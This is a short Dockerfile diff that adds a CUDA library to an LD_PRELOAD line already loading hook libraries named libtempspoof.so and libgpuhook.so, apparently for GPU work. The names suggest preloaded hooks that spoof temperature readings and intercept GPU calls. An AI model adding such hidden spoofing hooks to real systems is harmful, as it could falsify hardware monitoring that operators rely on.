@@ -205,7 +205,7 @@ RUN set -eux; \
         ldconfig; \
     fi
 
-ENV LD_PRELOAD="/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"
+ENV LD_PRELOAD="/usr/local/cuda/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0:/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"
 
 # ------------------  (14)  Verification và cleanup ------------------------
 RUN set -eux; \
